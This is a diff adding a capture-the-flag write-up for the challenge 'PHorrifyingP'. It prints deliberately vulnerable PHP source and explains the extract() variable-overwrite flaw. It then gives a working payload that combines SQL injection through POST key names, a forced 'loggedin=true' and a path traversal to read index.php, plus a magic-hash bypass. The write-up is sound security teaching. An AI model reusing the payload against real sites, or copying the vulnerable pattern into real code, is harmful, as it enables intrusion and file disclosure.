@@ -132,3 +132,77 @@ print(r.text)
 ```
 
 ``flag:flag{1ea5n_h0w_vu1n_h1ppen_and_wh1t_l1ne_m1ke_vu1n!!!}``
+
+# PHorrifyingP
+## solution
+Source code:
+```
+<?php
+/*
+    <flag> ➡➡➡ ⛳🏁 ⬅⬅⬅ <flag>
+*/
+if ($_SERVER['REQUEST_METHOD'] == 'POST'){
+    extract($_POST);
+
+    if (isset($_POST['password']) && md5($_POST['password']) == 'put hash here!'){
+        $loggedin = true;
+    }
+
+    if (md5($_SERVER['REMOTE_ADDR']) != '92d3fd4057d07f38474331ab231e1f0d'){
+        header('Location: ' . $_SERVER['REQUEST_URI']);
+    }
+
+    if (isset($loggedin) && $loggedin){
+        echo 'One step closer 😎<br>';
+
+        if (isset($_GET['action']) && md5($_GET['action']) == $_GET['action']){
+            echo 'Really? 😅<br>';
+
+            $db = new SQLite3('database.db');
+            $sql_where = Array('1=0');
+
+            foreach ($_POST as $key => $data) {
+                $sql_where[] = $db->escapeString($key) . "='" . $db->escapeString($data) . "'";
+            }
+
+            $result = $db->querySingle('SELECT login FROM users WHERE ' . implode(' AND ', $sql_where));
+
+            if ($result == 'admin'){
+                echo 'Last step 🤣<br>';
+
+                readfile(file_get_contents('php://input'));
+            }
+        }
+    }
+}
+?>
+
+```
+
+Exploit:
+
+PHP has a function named extract() to take all provided GET and POST requests and assign them to internal variables. Developers will, at times, use this function instead of manually assigning $_POST[var1] to $var1. This function will overwrite any previously defined variables, including server variables. Extract() has options which prevent overwriting previously-defined variables, however this safety is not enabled by default, and developers might not enable the safety, just as many do not perform input validation. This vulnerability is similar in design to the register globals vulnerabilities present in PHP.
+
+Reference: [here](https://davidnoren.com/post/php-extract-vulnerability/)
+
+Payload:
+
+```
+1%09OR%09login=admin&1--%20-=&loggedin=true&sth=../../../../../../../../../../../var/www/html/index.php
+```
+
+Explain: 
+This payload'll make the query looks like this:
+
+```
+SELECT login FROM users WHERE 1=0 AND 1 or  login=admin AND 1-- -comment...
+```
+
+And because of the ``extract()`` function, we can set ``loggedin=True`` and the path to attack path traversal.
+
+Oh i almost forgot about the param``$_GET['action']``, we can just simply bypass that with magic hash.
+
+![img](./img/4.png)
+
+flag: ``1337UP{PHP_SCARES_ME_IT_HAUNTS_ME_WHEN_I_SLEEP_ALL_I_CAN_SEE_IS_PHP_PLEASE_SOMEONE_HELP_ME}``
+
